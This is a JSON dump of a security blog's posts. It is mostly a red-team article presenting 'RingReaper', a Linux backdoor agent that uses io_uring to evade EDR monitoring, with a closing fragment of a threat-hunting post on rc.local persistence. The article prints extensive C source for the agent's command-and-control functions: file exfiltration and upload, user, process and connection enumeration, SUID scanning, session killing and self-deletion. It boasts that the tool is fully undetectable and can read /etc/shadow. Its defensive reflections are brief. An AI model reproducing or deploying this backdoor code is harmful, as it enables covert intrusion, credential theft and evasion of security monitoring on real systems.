\u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"}]